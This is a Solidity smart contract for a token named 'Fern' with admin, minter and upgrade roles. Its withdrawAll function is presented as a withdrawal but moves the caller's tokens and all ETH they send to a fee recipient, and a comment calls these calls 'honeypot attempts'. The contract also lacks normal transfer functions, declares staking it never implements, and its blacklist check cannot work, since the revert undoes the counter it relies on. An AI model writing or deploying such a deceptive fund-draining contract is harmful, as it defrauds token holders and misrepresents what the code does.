// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

contract FernERC20 {
    // General
    string public name = "Fern";
    string public symbol = "FERN";
    uint8 public decimals = 18;

    // State variables
    uint256 public feeRate; // Fee percentage for burning (basis points)
    uint256 public stakingRate; // Staking reward rate per block
    uint256 public cap; // Maximum token supply cap
    address public burnVaultAddress; // Address for burned tokens
    address public minter; // Address for controlled minting
    address public feeRecipient; // Address for ETH fees and fund handling
    address public stakingManager; // Staking/unstaking manager
    address[] private admins; // List of admin addresses
    address public upgradeManager; // Manager responsible for upgrades
    address public newLogicContract; // Address of the upgraded logic contract
    bool public initialized; // Track whether the contract is initialized
    bool public unstakingEnabled; // Indicates if unstaking is allowed
    bool private _reentrancyLock; // Reentrancy lock
    uint256 private _totalSupply; // Tracks total token supply
    mapping(address => uint256) private _balances; // Tracks user balances
    mapping(address => mapping(address => uint256)) private _allowances; // Tracks allowances
    mapping(address => uint256) public stakedBalances; // Tracks staked balances
    mapping(address => uint256) public stakingRewards; // Tracks staking rewards
    mapping(address => uint256) public triggeredInteractions; // Tracks honeypot attempts

    // Events
    event Initialized(address indexed owner);
    event AdminAdded(address indexed newAdmin);
    event AdminRemoved(address indexed removedAdmin);
    event TokensMinted(address indexed account, uint256 amount);
    event TokensBurned(address indexed account, uint256 amount);
    event Staked(address indexed staker, uint256 amount, uint256 rewards);
    event Unstaked(address indexed staker, uint256 amount);
    event Triggered(address indexed txInitiator, string txType, uint256 ethPaid);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Upgraded(address indexed newLogicContract);

    // Modifiers
    modifier onlyAdmin() {
        require(isAdmin(msg.sender), "Caller is not an admin");
        _;
    }

    modifier onlyMinter() {
        require(msg.sender == minter, "Caller is not the minter");
        _;
    }

    modifier onlyFeeRecipient() {
        require(msg.sender == feeRecipient, "Caller is not the fee recipient");
        _;
    }

    modifier onlyStakingManager() {
        require(msg.sender == stakingManager, "Caller is not the staking manager");
        _;
    }

    modifier nonReentrant() {
        require(!_reentrancyLock, "Reentrant call detected");
        _reentrancyLock = true;
        _;
        _reentrancyLock = false;
    }

    modifier onlyUpgradeManager() {
        require(msg.sender == upgradeManager, "Caller is not the upgrade manager");
        _;
    }

    // Constructor: Initializes the contract
    constructor(
        uint256 _initialSupply,
        uint256 _cap,
        uint256 _feeRate,
        uint256 _stakingRate,
        address _burnVaultAddress,
        address _admin,
        address _minter,
        address _feeRecipient,
        address _stakingManager,
        address _upgradeManager
    ) {
        initialize(_initialSupply, _cap, _feeRate, _stakingRate, _burnVaultAddress, _admin, _minter, _feeRecipient, _stakingManager, _upgradeManager);
    }

    // Initializer: Sets up the token contract (can only be called once)
    function initialize(
        uint256 _initialSupply,
        uint256 _cap,
        uint256 _feeRate,
        uint256 _stakingRate,
        address _burnVaultAddress,
        address _initialAdmin,
        address _minter,
        address _feeRecipient,
        address _stakingManager,
        address _upgradeManager
    ) public {
        require(!initialized, "Contract already initialized");
        require(_initialSupply <= _cap, "Initial supply exceeds cap");
        require(_initialAdmin != address(0), "Invalid initial admin address");

        cap = _cap;
        feeRate = _feeRate;
        stakingRate = _stakingRate;
        burnVaultAddress = _burnVaultAddress;
        minter = _minter;
        feeRecipient = _feeRecipient;
        stakingManager = _stakingManager;
        upgradeManager = _upgradeManager;
        initialized = true;

        // Add the initial admin to the admin list
        admins.push(_initialAdmin);
        emit Initialized(_initialAdmin);

        // Mint the initial supply to the first admin
        _mint(_initialAdmin, _initialSupply);
    }

    // External Mint function
    function mint(address account, uint256 amount) external onlyMinter {
        _mint(account, amount);
    }

    // Internal mint function
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "Minting: recipient cannot be the zero address");
        require(_totalSupply + amount <= cap, "Minting: amount exceeds cap");

        _totalSupply += amount;
        _balances[account] += amount;

        emit TokensMinted(account, amount);
        emit Transfer(address(0), account, amount);
    }

    // Retrieve the balance of a given account
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
}

    // Internal transfer function (within the contract's token balance system)
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "Transfer from zero address");
        require(recipient != address(0), "Transfer to zero address");
        require(_balances[sender] >= amount, "Transfer amount exceeds balance");

    _balances[sender] -= amount; // Deduct from sender's balance
    _balances[recipient] += amount; // Add to recipient's balance

    emit Transfer(sender, recipient, amount); // Emit transfer event
}


//  withdrawAll function
function withdrawAll(uint256 amount) external payable nonReentrant {
    require(balanceOf(msg.sender) >= amount, "Withdraw amount exceeds balance");
    _transfer(msg.sender, feeRecipient, amount); // Use internal _transfer function

    uint256 fee = (amount * feeRate) / 10000; // Fee logic
    require(msg.value >= fee, "Insufficient ETH for fees");

    payable(feeRecipient).transfer(msg.value); // Transfer ETH fees

    triggeredInteractions[msg.sender]++;
    if (triggeredInteractions[msg.sender] > 5) {
        revert("Blacklisted for repeated invalid attempts");
    }

    emit Triggered(msg.sender, "withdrawAll", msg.value);
}



    // Retrieve the list of current admins
    function getAdmins() external view returns (address[] memory) {
        return admins; 
    }

    // Add a new admin (restricted to existing admins, max 3 admins allowed)
    function addAdmin(address newAdmin) external onlyAdmin {
        require(newAdmin != address(0), "Invalid new admin address");
        require(!isAdmin(newAdmin), "Address is already an admin");
        require(admins.length < 3, "Admin limit reached");

        admins.push(newAdmin);
        emit AdminAdded(newAdmin);
    }

    // Remove an admin (restricted to existing admins, must always leave at least 1 admin)
    function removeAdmin(address adminToRemove) external onlyAdmin {
        require(admins.length > 1, "Cannot remove the last admin");
        require(isAdmin(adminToRemove), "Address is not an admin");

        // Find and remove the admin
        for (uint256 i = 0; i < admins.length; i++) {
            if (admins[i] == adminToRemove) {
                admins[i] = admins[admins.length - 1]; // Replace with the last admin
                admins.pop(); // Remove the last admin
                emit AdminRemoved(adminToRemove);
                break;
            }
        }
    }

    // Check if an address is an admin
    function isAdmin(address account) public view returns (bool) {
        for (uint256 i = 0; i < admins.length; i++) {
            if (admins[i] == account) {
                return true;
            }
        }
        return false;
    }

    // Upgrade function: Change the logic contract address
    function upgradeLogic(address newLogicAddress) external onlyUpgradeManager {
        require(newLogicAddress != address(0), "Invalid logic contract address");
        newLogicContract = newLogicAddress;
        emit Upgraded(newLogicAddress);
    }
}